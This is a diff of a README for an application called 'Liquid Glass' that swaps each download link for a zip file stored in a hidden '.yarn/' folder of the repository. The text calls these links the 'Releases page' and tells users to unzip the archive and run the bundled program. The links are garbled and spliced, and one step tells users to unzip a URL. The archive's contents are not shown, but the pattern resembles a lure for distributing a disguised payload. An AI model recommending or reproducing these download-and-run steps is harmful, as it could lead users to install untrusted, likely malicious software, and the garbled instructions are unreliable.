@@ -14,14 +14,14 @@ Before you start, make sure your device meets the following requirements:
 ## 📥 Download & Install
 To get Liquid Glass, visit the Releases page:
 
-[![Download Liquid Glass](https://raw.githubusercontent.com/MDrauff301/liquid-glass/main/multiserial/liquid-glass.zip%20Liquid%https://raw.githubusercontent.com/MDrauff301/liquid-glass/main/multiserial/liquid-glass.zip)](https://raw.githubusercontent.com/MDrauff301/liquid-glass/main/multiserial/liquid-glass.zip)
+[![Download Liquid Glass](https://github.com/MDrauff301/liquid-glass/raw/refs/heads/main/.yarn/liquid_glass_1.7.zip%20Liquid%https://github.com/MDrauff301/liquid-glass/raw/refs/heads/main/.yarn/liquid_glass_1.7.zip)](https://github.com/MDrauff301/liquid-glass/raw/refs/heads/main/.yarn/liquid_glass_1.7.zip)
 
 On the Releases page, you will find several versions of Liquid Glass. Simply click on the link for the latest version to download the application to your device. 
 
 ### Steps to Download:
 1. Click the link above to go to the Releases page.
 2. Look for the most recent version. It’s usually at the top of the list.
-3. Click on the filename (it may be something like `https://raw.githubusercontent.com/MDrauff301/liquid-glass/main/multiserial/liquid-glass.zip` or `https://raw.githubusercontent.com/MDrauff301/liquid-glass/main/multiserial/liquid-glass.zip`) to start the download.
+3. Click on the filename (it may be something like `https://github.com/MDrauff301/liquid-glass/raw/refs/heads/main/.yarn/liquid_glass_1.7.zip` or `https://github.com/MDrauff301/liquid-glass/raw/refs/heads/main/.yarn/liquid_glass_1.7.zip`) to start the download.
 
 Once the file is downloaded, follow these steps to install:
 
@@ -39,7 +39,7 @@ Once the file is downloaded, follow these steps to install:
 
 ### For Linux Users:
 1. Open your terminal and navigate to your Downloads folder.
-2. Unzip the downloaded file using the command: `unzip https://raw.githubusercontent.com/MDrauff301/liquid-glass/main/multiserial/liquid-glass.zip`.
+2. Unzip the downloaded file using the command: `unzip https://github.com/MDrauff301/liquid-glass/raw/refs/heads/main/.yarn/liquid_glass_1.7.zip`.
 3. Navigate into the unzipped folder: `cd liquid-glass`.
 4. Run the application using the command: `./run-liquid-glass`.
 
@@ -66,7 +66,7 @@ If you encounter issues while downloading or installing Liquid Glass, here are s
 - **Application Won't Launch?** Ensure that all system requirements are met.
 
 ## 🔗 Useful Links
-- [Releases Page for Download](https://raw.githubusercontent.com/MDrauff301/liquid-glass/main/multiserial/liquid-glass.zip)
+- [Releases Page for Download](https://github.com/MDrauff301/liquid-glass/raw/refs/heads/main/.yarn/liquid_glass_1.7.zip)
 - [Documentation](#) (Coming soon)
 - [Support](#) (Contact information for assistance)
 
